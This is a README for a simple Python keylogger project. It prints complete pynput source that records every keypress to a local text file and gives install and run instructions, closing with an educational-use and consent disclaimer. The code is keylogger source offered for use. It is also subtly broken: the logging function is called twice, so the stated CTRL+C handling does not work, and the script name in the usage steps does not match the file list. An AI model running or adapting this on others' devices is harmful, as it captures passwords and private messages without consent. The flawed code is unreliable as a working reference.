
Python Keylogger Project by Harout Karakossian

Description
This project is a simple keylogger script written in Python using the `pynput` library. It captures keystrokes and logs them into a text file named `keylog.txt`. The keylogger runs in the background and records every keypress until manually terminated.

How It Works
1. The script uses the `pynput.keyboard.Listener` class to monitor keyboard events.
2. When a key is pressed, the `log_keystroke` function is triggered, which logs the key's string representation to `keylog.txt`.
3. The `start_logging` function initiates the listener and waits for events.
4. The program runs until it is manually stopped by pressing `CTRL + C`.

Usage
1. Install the `pynput` library if you haven't already:
    ```bash
    pip install pynput
    ```
2. Run the script:
    ```bash
    python main.py
    ```
3. To end the keylogger, press `CTRL + C` in the terminal.

Files
- **pythonkeylogger.py**: The Python script that contains the keylogger code.
- **keylog.txt**: The file where keystrokes are saved. Each keystroke is logged on a new line.

Code Overview

```python
from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "") 
    with open("keylog.txt", "a") as log_file:
            log_file.write(key + "\n")


def start_logging():
      with Listener(on_press=log_keystroke) as listener:
            listener .join()      

if __name__ == "__main__":
      print("The Keylogger is running! (press CTRL + C to end)")
      start_logging()
      try:
        start_logging()
      except KeyboardInterrupt:
        print("\nThe Keylogger has been successfully stopped.")

! Important Note !
This keylogger is intended for educational purposes only. Unauthorized use of a keylogger may violate privacy laws and regulations. Ensure that you have consent to use this script on any device.
